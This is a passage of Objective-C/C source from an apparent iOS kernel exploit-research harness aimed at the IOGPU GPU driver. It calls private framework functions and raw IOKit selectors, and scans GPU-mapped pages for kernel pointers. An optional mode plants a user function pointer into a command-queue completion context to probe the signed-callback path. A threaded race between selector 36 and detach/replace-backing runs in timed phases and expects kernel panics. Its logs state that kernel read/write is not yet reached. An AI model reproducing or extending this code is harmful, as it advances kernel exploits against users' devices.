    uint64_t hk0 = 0;
    int hnk = c ? p011_scan_kptr(c, scan, &hk0) : 0;
    p011_log("H  DETACH-ONLY scan %zu: n41=%d n43=%d n11=%d n00=%d nEE=%d nfor=%d nkptr=%d k0=0x%llx",
             scan, h41, h43, h11, h00, hee, hfor, hnk, (unsigned long long)hk0);
    fcntl(p011_fd, F_FULLFSYNC);
    if (vak2 == KERN_SUCCESS)
        vm_deallocate(mach_task_self(), reuse2, reuse_len);

    /* ---------- PART B/C/D/E after consumer so a crash here keeps F/G/H ---------- */
    p011_log("\n=== PART B: CheckSysMem only if client-shared looks like userspace ===");
    p011_log("[*] skip FinishSysMem/FinishEvent: type 0x80 tail-calls FinishEvent blraa device+0x70 (v10a).");
    fcntl(p011_fd, F_FULLFSYNC);
    void *client = NULL;
    if (getCli && g_ref) client = getCli(g_ref);
    p011_log("B  GetClientShared -> %p heap=%d", client, p011_is_heap(client));
    if (checkSys && p011_is_heap(client)) {
        uint32_t v0 = checkSys(g_ref, 0);
        uint32_t v1 = checkSys(g_ref, 1);
        p011_log("B  CheckSysMem(0)=%u (1)=%u", v0, v1);
    } else {
        p011_log("B  skip CheckSysMem (no client mapping — bit7 path ldr [+0x48])");
    }
    (void)finSys;

    p011_log("\n=== PART C: SubmitCommandBuffers EMPTY only (dummy list was kernel garbage) ===");
    fcntl(p011_fd, F_FULLFSYNC);
    if (submit && p011_is_heap(qRef)) {
        uint32_t sout = 0xFFFFFFFFu;
        kern_return_t kr = submit(qRef, 0, 0, NULL, 0, &sout);
        p011_log("C  Submit(NULL,0) -> 0x%08x %s out=%u (expect 2c2)",
                 (unsigned)kr, p011_kr(kr), sout);
    } else {
        p011_log("C  skip Submit (qRef heap=%d)", p011_is_heap(qRef));
    }

    p011_log("\n=== PART C2: Device UC sel=3 clock getter (negative — NOT SetPurgeable) ===");
    fcntl(p011_fd, F_FULLFSYNC);
    uint32_t clock_conn = dconn ? dconn : rconn;
    if (iocall && clock_conn) {
        uint8_t st8[8];
        memset(st8, 0, sizeof(st8));
        size_t sz = 8;
        kern_return_t kr = iocall(clock_conn, 3, NULL, 0, NULL, 0, NULL, NULL, st8, &sz);
        uint64_t w = 0;
        memcpy(&w, st8, sizeof(w));
        p011_log("C2 clock sel=3 0sc stOut=8 -> 0x%08x %s sz=%zu word=0x%llx",
                 (unsigned)kr, p011_kr(kr), sz, (unsigned long long)w);
        uint64_t in[2] = { p011_res_id(g_ref), 3 };
        uint64_t out = 0;
        uint32_t nout = 1;
        kr = iocall(clock_conn, 3, in, 2, NULL, 0, &out, &nout, NULL, NULL);
        p011_log("C2 sel=3 2sc {id,3} -> 0x%08x %s (expect 2c2 if table sel=3 is clock)",
                 (unsigned)kr, p011_kr(kr));
    } else {
        p011_log("C2 skip clock (conn=%u)", clock_conn);
    }

    p011_log("\n=== PART D: CreateDeviceShmem sel=0xc (validated C device only) ===");
    fcntl(p011_fd, F_FULLFSYNC);
    if (mkShmem && p011_is_heap(devRef) && dconn) {
        void *mapped = NULL;
        uint32_t oa = 0, ob = 0;
        kern_return_t kr = mkShmem(devRef, 0x4000, 0, &mapped, &oa, &ob);
        p011_log("D  CreateShmem 0x4000 flags=0 -> 0x%08x %s map=%p a=%u b=%u",
                 (unsigned)kr, p011_kr(kr), mapped, oa, ob);
        if (kr == 0 && rmShmem) {
            rmShmem(devRef, oa);
            p011_log("D  DestroyShmem(id=%u)", oa);
        }
    } else {
        p011_log("D  skip shmem (devRef heap=%d dconn=%u)", p011_is_heap(devRef), dconn);
    }

    p011_log("\n=== PART E: IOQ Create(0,0) once + PerformIO/Complete (P010 sel=49 already) ===");
    fcntl(p011_fd, F_FULLFSYNC);
    if (ioqCreate && p011_is_heap(devRef) && dconn) {
        p011_log("E  calling IOQCreate(dev,NULL,0,0)");
        fcntl(p011_fd, F_FULLFSYNC);
        void *ioq = ioqCreate(devRef, NULL, 0, 0);
        p011_log("E  IOQCreate -> %p", ioq);
        fcntl(p011_fd, F_FULLFSYNC);
        if (ioq) {
            if (ioqPerf) {
                kern_return_t kr = ioqPerf(ioq);
                p011_log("E  PerformIO -> 0x%08x %s", (unsigned)kr, p011_kr(kr));
            }
            if (ioqDone) {
                kern_return_t kr = ioqDone(ioq);
                p011_log("E  Complete -> 0x%08x %s", (unsigned)kr, p011_kr(kr));
            }
            if (ioqRel) ioqRel(ioq);
        }
    } else {
        p011_log("E  skip IOQ (P010 already: sel=49 2c2 without IOQ object)");
    }

    (void)spare;
    (void)spare_pages;
    (void)spare_len;

    if (nk > 0)
        p011_log("=== verdict: INFLIGHT kptr (nkptr=%d k0=0x%llx). Phys read. Not a store. Not KRW. ===",
                 nk, (unsigned long long)k0);
    else if (nee > 0)
        p011_log("=== verdict: F INFLIGHT 0xEE (%d). UPL completed while GART snapshot lived. Window live. Not KRW. ===",
                 nee);
    else if (hee > 0)
        p011_log("=== verdict: H DETACH-ONLY 0xEE (%d). Detach completed UPL, GART snapshot lived. Window live. Not KRW. ===",
                 hee);
    else if (nfor > 0)
        p011_log("=== verdict: F FOREIGN nfor=%d first=0x%02x. Paste. Not KRW. ===", nfor, ff);
    else if (n41 > 0 && pee > 0)
        p011_log("=== verdict: F=0x41 G=0xEE. Complete after snapshot copy. Not KRW. ===");
    else if (n41 > 0 && hee == 0)
        p011_log("=== verdict: still 0x41 (F n41=%d G n41=%d H n41=%d nEE F/G/H=%d/%d/%d). IOMMU wired through wait. Not KRW. ===",
                 n41, p41, h41, nee, pee, hee);
    else if (n00 > n41 && n00 > n43)
        p011_log("=== verdict: F mostly 0x00. Pages discarded, GPU copied empty. Not KRW. ===");
    else
        p011_log("=== verdict: F 41=%d EE=%d 00=%d / G 41=%d EE=%d / H 41=%d EE=%d. Paste. Not KRW. ===",
                 n41, nee, n00, p41, pee, h41, hee);
    return p011_finish();
}

/* p012ctx: completion-context ABI map (DEAD as KRW).
 *
 * BUG (old): stuffed p012_trivial INTO entry+0x10. Kernel treats +0x10 as a
 * *context pointer*, then DispatchAvailable does ldr [ctx,#0x10]! → hang
 * (seen: memory read failed inside IOGPUNotificationQueueDispatchAvailable…).
 *
 * DEFAULT: entry+0x10=0 smoke (NQ gate off) — no freeze.
 * Optional: P012_FIRE=1 → entry+0x10=+0x18=real ctx, ctx+0x10=fn (p027 layout).
 */
static uint64_t g_p012_x0;
static uint8_t  g_p012_ctx_dump[0x40];
static uint8_t  g_p012_ctx_obj[0x40]; /* must outlive NQ callback if FIRE */
static int      g_p012_dumped;
static int      g_p012_fired;

__attribute__((noinline, used, optnone))
static void p012_trivial(void *arg) {
    uint64_t x0 = (uint64_t)arg;
    g_p012_x0 = x0;
    g_p012_fired = 1;
    p011_log("p012 [cb] entered x0=0x%llx — if this is last line, dump at x0 crashed",
             (unsigned long long)x0);
    if (p011_fd >= 0) fcntl(p011_fd, F_FULLFSYNC);
    if (x0 >= 0x100000000ULL && x0 < 0x800000000ULL) {
        memcpy(g_p012_ctx_dump, (const void *)(uintptr_t)x0, 0x40);
        g_p012_dumped = 1;
        p011_log("p012 [cb] dumped 0x40 at x0");
    } else {
        p011_log("p012 [cb] x0 not userspace — skip dump (x0 itself is the data)");
    }
    if (p011_fd >= 0) fcntl(p011_fd, F_FULLFSYNC);
}

static int p012_fire_enabled(void) {
    const char *e = getenv("P012_FIRE");
    if (!e || !e[0]) return 0;
    if (e[0] == '0' && e[1] == 0) return 0;
    if (!strcasecmp(e, "no") || !strcasecmp(e, "false") || !strcasecmp(e, "off"))
        return 0;
    return 1;
}

static const char *p012_marker_name(uint64_t v, uint64_t fn, uint64_t ctx) {
    if (v == 0x0000A00000000000ULL) return "+0x00";
    if (v == 0x0000A00000000001ULL) return "+0x08";
    if (v == 0x0000A00000000004ULL) return "+0x20";
    if (v == 0x0000A00000000005ULL) return "+0x28";
    if (v == 0x0000A00000000006ULL) return "+0x30";
    if (v == 0x0000A00000000007ULL) return "+0x38";
    if (ctx && v == ctx) return "ctx";
    if (fn && v == fn) return "fn@ctx+0x10";
    if (v == 0) return "0";
    return "?";
}

+ (NSString *)runCompletionContextMap {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    g_p012_x0 = 0;
    memset(g_p012_ctx_dump, 0, sizeof(g_p012_ctx_dump));
    memset(g_p012_ctx_obj, 0, sizeof(g_p012_ctx_obj));
    g_p012_dumped = 0;
    g_p012_fired = 0;
    int fire = p012_fire_enabled();
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p012_ctx_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== p012ctx: completion context ABI map ===");
    p011_log("BUILD p012-map-v2-safe (PRIM_STRENGTH_CASE row E)");
    p011_log("[*] A14 23F77. Submit(q,0,1,entry,0x40).");
    p011_log("[fix] old p012 put FN at entry+0x10 → NQ treated FN as ctx → freeze");
    p011_log("[abi] entry+0x10 = CTX ptr (gate); ctx+0x10 = FP; blraa not blraaz");
    p011_log("[abi] entry+0x18 = CTX (Glue: never 0 on nested path)");
    p011_log("[lock] DEFAULT entry+0x10=0 smoke (P012_FIRE=%s)", fire ? "1" : "0");
    p011_log("[lock] STRONG ABI; DEAD as KRW (p027–p030 exhaust). Prefer button 65.");
    p011_log("NOT KRW.");
    fcntl(p011_fd, F_FULLFSYNC);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { p011_log("p012 [0] STOP dlopen IOGPU"); return p011_finish(); }

    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P011GetU64_t getLen = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    P011GetU64_t getVA  = (P011GetU64_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    p011_getconn_t devConn = (p011_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p011_getconn_t qConn = (p011_getconn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    p011_getqid_t qGetID = (p011_getqid_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    p011_submit_t submit = (p011_submit_t)dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");
    p011_log("p012 [0] submit=%p qConn=%p", submit, qConn);
    if (!submit) { p011_log("p012 [0] STOP no SubmitCommandBuffers"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("p012 [0] STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("p012 [0] STOP no queue"); return p011_finish(); }
    p011_log("p012 [0] metal %s qclass=%s",
             [[g_dev name] UTF8String],
             [NSStringFromClass([p011_unwrap(g_q) class]) UTF8String]);

    id mtlDev = p011_unwrap(g_dev);
    id mtlQ = p011_unwrap(g_q);
    void *devRef = p011_strip(p011_ivar(mtlDev, "_deviceRef"));
    void *qRef = p011_strip(p011_ivar(mtlQ, "_commandQueue"));
    p011_log("p012 [0] _deviceRef=%p heap=%d  _commandQueue=%p heap=%d",
             devRef, p011_is_heap(devRef), qRef, p011_is_heap(qRef));
    fcntl(p011_fd, F_FULLFSYNC);

    uint32_t dconn = 0, qconn = 0, qid = 0;
    if (p011_is_heap(devRef) && devConn) {
        dconn = devConn(devRef);
        p011_log("p012 [0] DeviceGetConnect -> %u", dconn);
    } else {
        p011_log("p012 [0] skip DeviceGetConnect");
    }
    if (p011_is_heap(qRef) && qConn) {
        qconn = qConn(qRef);
        qid = qGetID ? qGetID(qRef) : 0;
        p011_log("p012 [0] QueueGetConnect -> %u qid=%u same=%d", qconn, qid, dconn && dconn == qconn);
    } else {
        p011_log("p012 [0] skip QueueGetConnect");
    }
    fcntl(p011_fd, F_FULLFSYNC);

    /* MAIN + SPARE type 0x80, same as v10. */
    vm_address_t main_pages = 0, spare_pages = 0;
    vm_size_t main_len = 0, spare_len = 0;
    uint32_t typ = 0;
    uint64_t gva = 0, gvaLen = 0;
    id<MTLBuffer> spare = nil;
    void *spare_ref = NULL;
    const vm_size_t tries[] = { 0x4000, 0x10000 };
    int flags_try[2] = { VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE, VM_FLAGS_ANYWHERE };

    for (int which = 0; which < 2; which++) {
        id<MTLBuffer> got = nil;
        void *got_ref = NULL;
        vm_address_t got_p = 0;
        vm_size_t got_l = 0;
        uint32_t got_t = 0;
        uint64_t got_gva = 0, got_glen = 0;
        for (int fi = 0; fi < 2 && !got; fi++) {
            for (unsigned ti = 0; ti < 2 && !got; ti++) {
                vm_size_t Ls = tries[ti];
                vm_address_t pg = 0;
                if (vm_allocate(mach_task_self(), &pg, Ls, flags_try[fi]) != KERN_SUCCESS || !pg)
                    continue;
                memset((void *)pg, which ? 0x5A : P011_FILL_OLD, (size_t)Ls);
                id<MTLBuffer> b = [g_dev newBufferWithBytesNoCopy:(void *)pg
                                                           length:(NSUInteger)Ls
                                                          options:MTLResourceStorageModeShared
                                                      deallocator:^(void *ptr, NSUInteger n) {
                                                          (void)ptr; (void)n;
                                                      }];
                void *r = b ? p011_ref(b) : NULL;
                uint32_t t = (r && getType) ? getType(r) : 0;
                p011_log("p012 [0] %s flags=0x%x 0x%lx type=0x%x buf=%p",
                         which ? "spare" : "main", flags_try[fi], (unsigned long)Ls, t, b);
                if (!b || !r || t != 0x80) {
                    vm_deallocate(mach_task_self(), pg, Ls);
                    continue;
                }
                got = b; got_ref = r; got_p = pg; got_l = Ls; got_t = t;
                got_glen = getLen ? getLen(r) : Ls;
                got_gva = getVA ? getVA(r) : 0;
            }
        }
        if (which == 0) {
            g_buf = got; g_ref = got_ref; main_pages = got_p; main_len = got_l;
            typ = got_t; gva = got_gva; gvaLen = got_glen;
        } else {
            spare = got; spare_ref = got_ref; spare_pages = got_p; spare_len = got_l;
        }
    }
    if (!g_buf || typ != 0x80) {
        p011_log("p012 [0] STOP no type 0x80 main");
        return p011_finish();
    }
    p011_log("p012 [0] MAIN type=0x80 GPUVA=0x%llx GVALen=0x%llx",
             (unsigned long long)gva, (unsigned long long)gvaLen);
    p011_dump_res("p012 [0] MAIN", g_ref);
    if (spare_ref) p011_dump_res("p012 [0] SPARE", spare_ref);
    else p011_log("p012 [0] SPARE missing");
    uint32_t rconn = p011_res_conn(g_ref);
    p011_log("p012 [0] MAIN id=%u res_conn=%u dconn=%u", p011_res_id(g_ref), rconn, dconn);
    fcntl(p011_fd, F_FULLFSYNC);

    if (!p011_is_heap(qRef)) {
        p011_log("p012 [0] STOP qRef not heap");
        return p011_finish();
    }

    uint64_t entry[8];
    memset(entry, 0, sizeof(entry));
    void (*fp)(void *) = p012_trivial;
    uint64_t fn = 0;
    memcpy(&fn, &fp, sizeof(fn));
    uint64_t ctx = (uint64_t)(uintptr_t)g_p012_ctx_obj;

    /* Markers in unused entry slots; NEVER put fn at +0x10. */
    entry[0] = 0x0000A00000000000ULL;
    entry[1] = 0x0000A00000000001ULL;
    entry[4] = 0x0000A00000000004ULL;
    entry[5] = 0x0000A00000000005ULL;
    entry[6] = 0x0000A00000000006ULL;
    entry[7] = 0x0000A00000000007ULL;

    if (fire) {
        memset(g_p012_ctx_obj, 0, sizeof(g_p012_ctx_obj));
        *(uint64_t *)(g_p012_ctx_obj + 0x00) = 0x0000A00000000010ULL;
        *(uint64_t *)(g_p012_ctx_obj + 0x08) = 0x0000A00000000011ULL;
        *(uint64_t *)(g_p012_ctx_obj + 0x10) = fn; /* FP for blraa */
        *(uint64_t *)(g_p012_ctx_obj + 0x18) = 0x0000A00000000013ULL;
        *(uint64_t *)(g_p012_ctx_obj + 0x20) = 0x0000A00000000014ULL;
        *(uint64_t *)(g_p012_ctx_obj + 0x28) = 0x0000A00000000015ULL;
        entry[2] = ctx; /* +0x10 gate = ctx */
        entry[3] = ctx; /* +0x18 = ctx (not marker, not 0) */
        p011_log("p012 [1] FIRE mode: entry+0x10=+0x18=ctx=0x%llx ctx+0x10=fn=0x%llx",
                 (unsigned long long)ctx, (unsigned long long)fn);
    } else {
        entry[2] = 0; /* +0x10 = 0 → NQ gate OFF — safe smoke */
        entry[3] = 0;
        p011_log("p012 [1] SAFE smoke: entry+0x10=0 (no DispatchAvailable fire)");
        p011_log("p012 [1] setenv P012_FIRE=1 only if you need live ctx path");
    }

    p011_log("p012 [1] entry+0x00=0x%llx +0x08=0x%llx +0x10=0x%llx +0x18=0x%llx",
             (unsigned long long)entry[0], (unsigned long long)entry[1],
             (unsigned long long)entry[2], (unsigned long long)entry[3]);
    p011_log("p012 [1] entry+0x20=0x%llx +0x28=0x%llx +0x30=0x%llx +0x38=0x%llx",
             (unsigned long long)entry[4], (unsigned long long)entry[5],
             (unsigned long long)entry[6], (unsigned long long)entry[7]);
    p011_log("p012 [1] p012_trivial=%p", fp);
    fcntl(p011_fd, F_FULLFSYNC);

    uint32_t sout = 0xFFFFFFFFu;
    p011_log("p012 [2] Submit(q,0,1,entry,0x40)%s",
             fire ? " — FIRE: if hang, PAC/ctx still bad" : " — safe gate-off");
    fcntl(p011_fd, F_FULLFSYNC);

    kern_return_t kr = submit(qRef, 0, 1, entry, 0x40, &sout);
    p011_log("p012 [2] Submit -> 0x%08x %s out=%u", (unsigned)kr, p011_kr(kr), sout);
    fcntl(p011_fd, F_FULLFSYNC);

    if (fire) {
        p011_log("p012 [3] waiting 100ms for completion callback");
        fcntl(p011_fd, F_FULLFSYNC);
        usleep(100000);
    } else {
        p011_log("p012 [3] skip wait — gate off, callback must not fire");
    }

    p011_log("p012 [3] fired=%d dumped=%d x0=0x%llx (%s)",
             g_p012_fired, g_p012_dumped, (unsigned long long)g_p012_x0,
             p012_marker_name(g_p012_x0, fn, ctx));
    if (g_p012_dumped) {
        for (int i = 0; i < 8; i++) {
            uint64_t w;
            memcpy(&w, g_p012_ctx_dump + i * 8, 8);
            p011_log("p012 [3] ctx[%d] +0x%02x = 0x%llx (%s)",
                     i, i * 8, (unsigned long long)w, p012_marker_name(w, fn, ctx));
        }
    }
    fcntl(p011_fd, F_FULLFSYNC);

    if (!fire && kr == 0 && !g_p012_fired) {
        p011_log("=== verdict: SAFE smoke OK submit=0 fired=0 (NQ gate off) ===");
    } else if (g_p012_fired) {
        p011_log("p012 verdict: FIRE ok x0=0x%llx dumped=%d submit=0x%08x",
                 (unsigned long long)g_p012_x0, g_p012_dumped, (unsigned)kr);
    } else if (kr != 0) {
        p011_log("p012 verdict: submit-fail 0x%08x %s fired=0",
                 (unsigned)kr, p011_kr(kr));
    } else if (fire) {
        p011_log("p012 verdict: FIRE submit=0 fired=0 (PAC or no NQ in 100ms)");
    } else {
        p011_log("p012 verdict: unexpected fired=%d", g_p012_fired);
    }
    p011_log("p012 note: NOT KRW — do not reopen as prim. Button 65 = legit NQ.");

    (void)spare; (void)spare_pages; (void)spare_len;
    (void)main_pages; (void)main_len;
    (void)qconn;
    return p011_finish();
}

#define P014_HIST 12
#define P014_SEC  10

typedef struct {
    unsigned kr;
    uint64_t n;
} p014_kh;
typedef struct {
    uint64_t v;
    uint64_t n;
} p014_oh;

typedef struct {
    void *ref;
    P011Detach_t detach;
    P011Replace_t repl;
    p011_iocall_t iocall;
    mach_port_t conn;
    uint32_t id;
    uint64_t sel_len;
    void *pages[2];
    size_t plen;
    __unsafe_unretained id spray_dev;
    P011GetType_t getType;
    atomic_ullong *spray_ok;
    atomic_ullong *spray_fail;
    atomic_int *stop;
    atomic_ullong *iters;
    int do_sel36;
    int do_repl;
    p014_kh *kh;
    p014_oh *oh;
    uint64_t *det_fail;
    uint64_t *rep_fail;
    uint64_t *rep_ok;
} p014_arg;

static void p014_hist_kr(p014_kh *h, unsigned kr) {
    @synchronized ([NSString class]) {
        for (int i = 0; i < P014_HIST; i++) {
            if (h[i].n && h[i].kr == kr) { h[i].n++; return; }
            if (h[i].n == 0) { h[i].kr = kr; h[i].n = 1; return; }
        }
        /* overflow bucket: last slot accumulates unknown */
        h[P014_HIST - 1].n++;
    }
}

static void p014_hist_out(p014_oh *h, uint64_t v) {
    @synchronized ([NSString class]) {
        for (int i = 0; i < P014_HIST; i++) {
            if (h[i].n && h[i].v == v) { h[i].n++; return; }
            if (h[i].n == 0) { h[i].v = v; h[i].n = 1; return; }
        }
        h[P014_HIST - 1].n++;
    }
}

static void p014_dump_hist(const char *phase, uint64_t ia, uint64_t ib,
                           p014_kh *kh, p014_oh *oh,
                           uint64_t det_fail, uint64_t rep_ok, uint64_t rep_fail,
                           uint64_t expected_out) {
    char krbuf[256];
    int kn = 0;
    krbuf[0] = 0;
    for (int i = 0; i < P014_HIST && kh[i].n; i++) {
        int m = snprintf(krbuf + kn, sizeof(krbuf) - (size_t)kn,
                         "%s0x%x:%llu", kn ? "," : "", kh[i].kr,
                         (unsigned long long)kh[i].n);
        if (m < 0) break;
        kn += m;
        if (kn >= (int)sizeof(krbuf) - 8) break;
    }
    char obuf[256];
    int on = 0;
    obuf[0] = 0;
    for (int i = 0; i < P014_HIST && oh[i].n; i++) {
        int m = snprintf(obuf + on, sizeof(obuf) - (size_t)on,
                         "%s0x%llx:%llu%s", on ? "," : "",
                         (unsigned long long)oh[i].v,
                         (unsigned long long)oh[i].n,
                         (expected_out != (uint64_t)-1 && oh[i].v != expected_out) ? "!" : "");
        if (m < 0) break;
        on += m;
        if (on >= (int)sizeof(obuf) - 8) break;
    }
    p011_log("p014 [%s] itersA=%llu itersB=%llu kr={%s} sout={%s} det_fail=%llu rep_ok=%llu rep_fail=%llu",
             phase, (unsigned long long)ia, (unsigned long long)ib,
             kn ? krbuf : "-", on ? obuf : "-",
             (unsigned long long)det_fail, (unsigned long long)rep_ok,
             (unsigned long long)rep_fail);
}

static void *p014_worker(void *u) {
    p014_arg *a = (p014_arg *)u;
    int which = 0;
    while (!atomic_load(a->stop)) {
        if (a->do_sel36 && a->iocall && a->conn) {
            uint64_t in[3] = { a->id, 0, a->sel_len ? a->sel_len : 8 };
            uint64_t out = 0;
            uint32_t nout = 1;
            kern_return_t kr = a->iocall(a->conn, 36, in, 3, NULL, 0,
                                         &out, &nout, NULL, NULL);
            p014_hist_kr(a->kh, (unsigned)kr);
            if (kr == 0)
                p014_hist_out(a->oh, out);
            atomic_fetch_add(a->iters, 1);
        }
        if (a->do_repl && a->detach && a->repl && a->ref) {
            int d = a->detach(a->ref);
            if (d != 0) {
                @synchronized ([NSString class]) { (*a->det_fail)++; }
            } else {
                int r = a->repl(a->ref, a->pages[which], (uint64_t)a->plen);
                if (r == 0) {
                    @synchronized ([NSString class]) { (*a->rep_ok)++; }
                    which ^= 1;
                } else {
                    @synchronized ([NSString class]) { (*a->rep_fail)++; }
                }
            }
            atomic_fetch_add(a->iters, 1);
        }
        if (!a->do_sel36 && !a->do_repl)
            break;
    }
    return NULL;
}

static void p014_run_phase(const char *phase, p014_arg *a, p014_arg *b, int sec) {
    atomic_int stop = 0;
    atomic_ullong ia = 0, ib = 0;
    p014_kh kh[P014_HIST];
    p014_oh oh[P014_HIST];
    uint64_t det_fail = 0, rep_ok = 0, rep_fail = 0;
    memset(kh, 0, sizeof(kh));
    memset(oh, 0, sizeof(oh));
    a->stop = &stop;
    a->iters = &ia;
    a->kh = kh;
    a->oh = oh;
    a->det_fail = &det_fail;
    a->rep_ok = &rep_ok;
    a->rep_fail = &rep_fail;
    if (b) {
        b->stop = &stop;
        b->iters = &ib;
        b->kh = kh;
        b->oh = oh;
        b->det_fail = &det_fail;
        b->rep_ok = &rep_ok;
        b->rep_fail = &rep_fail;
    }
    p011_log("p014 [%s] START %ds — if this is last line, died in %s", phase, sec, phase);
    fcntl(p011_fd, F_FULLFSYNC);

    pthread_t ta, tb;
    int ha = pthread_create(&ta, NULL, p014_worker, a);
    int hb = -1;
    if (b) hb = pthread_create(&tb, NULL, p014_worker, b);
    if (ha != 0) {
        p011_log("p014 [%s] STOP pthread A %d", phase, ha);
        return;
    }
    usleep((useconds_t)sec * 1000000u);
    atomic_store(&stop, 1);
    pthread_join(ta, NULL);
    if (hb == 0) pthread_join(tb, NULL);

    uint64_t exp = (uint64_t)-1;
    if (oh[0].n) exp = oh[0].v;
    p014_dump_hist(phase, atomic_load(&ia), atomic_load(&ib),
                   kh, oh, det_fail, rep_ok, rep_fail, exp);
    fcntl(p011_fd, F_FULLFSYNC);
}

+ (NSString *)runSel36ReplaceRace {
    p011_buf = [NSMutableString string];
    g_surf = NULL;
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p014_ane_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p011_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    p011_log("=== p014ane: sel=36 vs P009 detach+replace (type 0x80) ===");
    p011_log("[*] A14 23F77. sel36 ABI (id, off=0, len=8) scIn=3 scOut=1.");
    p011_log("[*] Thread A IOConnectCallMethod(conn,36). Thread B detach+replace(0x4000).");
    p011_log("[*] 10s phases: A-only, B-only, concurrent, swap, interleaved.");
    p011_log("[*] Panic = paste ips. Not KRW.");
    fcntl(p011_fd, F_FULLFSYNC);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) { p011_log("p014 [0] STOP dlopen IOGPU"); return p011_finish(); }

    g_detach = (P011Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_repl   = (P011Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P011GetType_t getType = (P011GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    p011_getconn_t devConn = (p011_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    p011_iocall_t iocall = iokit ? (p011_iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    p011_log("p014 [0] detach=%p replace=%p iocall=%p", g_detach, g_repl, iocall);
    if (!g_detach || !g_repl) { p011_log("p014 [0] STOP no Detach/Replace"); return p011_finish(); }
    if (!iocall) { p011_log("p014 [0] STOP no IOConnectCallMethod"); return p011_finish(); }

    g_dev = MTLCreateSystemDefaultDevice();
    if (!g_dev) { p011_log("p014 [0] STOP no device"); return p011_finish(); }
    g_q = [g_dev newCommandQueue];
    if (!g_q) { p011_log("p014 [0] STOP no queue"); return p011_finish(); }

    id mtlDev = p011_unwrap(g_dev);
    void *devRef = p011_strip(p011_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = 0;
    if (p011_is_heap(devRef) && devConn)
        dconn = devConn(devRef);
    p011_log("p014 [0] _deviceRef=%p heap=%d dconn=%u", devRef, p011_is_heap(devRef), dconn);

    const vm_size_t Ls = 0x4000;
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
        p011_log("p014 [0] STOP vm_allocate main");
        return p011_finish();
    }
    memset((void *)pg, 0x41, (size_t)Ls);
    id<MTLBuffer> buf = [g_dev newBufferWithBytesNoCopy:(void *)pg
                                                 length:(NSUInteger)Ls
                                                options:MTLResourceStorageModeShared
                                            deallocator:^(void *ptr, NSUInteger n) {
                                                (void)ptr; (void)n;
                                            }];
    void *ref = buf ? p011_ref(buf) : NULL;
    uint32_t typ = (ref && getType) ? getType(ref) : 0;
    p011_log("p014 [0] bytesNoCopy 0x%lx type=0x%x buf=%p ref=%p",
             (unsigned long)Ls, typ, buf, ref);
    if (!buf || !ref || typ != 0x80) {
        p011_log("p014 [0] STOP no type 0x80");
        vm_deallocate(mach_task_self(), pg, Ls);
        return p011_finish();
    }
    uint32_t rid = p011_res_id(ref);
    uint32_t rconn = p011_res_conn(ref);
    uint32_t conn = dconn ? dconn : rconn;
    p011_dump_res("p014 [0]", ref);
    p011_log("p014 [0] id=%u res_conn=%u dconn=%u using_conn=%u", rid, rconn, dconn, conn);
    if (!conn || !rid) {
        p011_log("p014 [0] STOP conn=%u id=%u", conn, rid);
        return p011_finish();
    }
    fcntl(p011_fd, F_FULLFSYNC);

    vm_address_t p0 = 0, p1 = 0;
    if (vm_allocate(mach_task_self(), &p0, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p0 ||
        vm_allocate(mach_task_self(), &p1, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !p1) {
        p011_log("p014 [0] STOP replace-page alloc");
        return p011_finish();
    }
    memset((void *)p0, 0x43, (size_t)Ls);
    memset((void *)p1, 0x45, (size_t)Ls);

    p014_arg base;
    memset(&base, 0, sizeof(base));
    base.ref = ref;
    base.detach = g_detach;
    base.repl = g_repl;
    base.iocall = iocall;
    base.conn = conn;
    base.id = rid;
    base.sel_len = 8;
    base.pages[0] = (void *)p0;
    base.pages[1] = (void *)p1;
    base.plen = (size_t)Ls;

    p011_log("p014 [calib] calling sel36 {id=%u,0,8} — if last line, died on first sel36", rid);
    fcntl(p011_fd, F_FULLFSYNC);
    {
        uint64_t in[3] = { rid, 0, 8 };
        uint64_t out = 0;
        uint32_t nout = 1;
        kern_return_t kr = iocall(conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
